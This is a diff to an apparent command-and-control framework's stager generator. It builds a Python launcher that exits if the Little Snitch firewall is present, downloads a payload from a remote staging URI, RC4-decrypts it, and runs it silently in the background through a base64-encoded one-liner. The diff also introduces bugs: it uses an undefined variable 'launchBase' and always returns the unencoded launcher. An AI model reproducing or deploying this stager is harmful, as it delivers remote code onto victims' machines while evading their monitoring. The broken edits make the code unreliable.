@@ -250,15 +250,15 @@ class Stagers:
                 launcherBase += "if re.search(\"Little Snitch\", out):\n"
                 launcherBase += "   sys.exit()\n"
         except Exception as e:
-            p = "[!] Error setting LittleSnitch in stagger: " + str(e)
+            p = "[!] Error setting LittleSnitch in stager: " + str(e)
             print helpers.color(p, color="Yellow")
 
         
-        launcherBase += "o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener();"
-        launcherBase += "UA='%s';" % (userAgent)
-        launcherBase += "o.addheaders=[('User-Agent',UA)];"
-        launcherBase += "a=o.open('%s').read();" % (stage0uri)
-        launcherBase += "key='%s';" % (stagingKey)
+        launcherBase += "o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener();\n"
+        launcherBase += "UA='%s';\n" % (userAgent)
+        launcherBase += "o.addheaders=[('User-Agent',UA)];\n"
+        launcherBase += "a=o.open('%s').read();\n" % (stage0uri)
+        launcherBase += "key='%s';\n" % (stagingKey)
         # RC4 decryption
         launcherBase += "S,j,out=range(256),0,[]\n"
         launcherBase += "for i in range(256):\n"
@@ -277,9 +277,9 @@ class Stagers:
             launchEncoded = base64.b64encode(launcherBase)
             # launcher = "python -c \"import sys,base64;exec(base64.b64decode('%s'));\"" %(launchEncoded)
             launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python &>/dev/null &" % (launchEncoded)
-            return launcher
         else:
-            return launcherBase
+            launcher = "echo \"%s\" | python &>/dev/null &" % (launchBase)
+        return launcherBase
 
     def generate_hop_php(self, server, resources):
         """
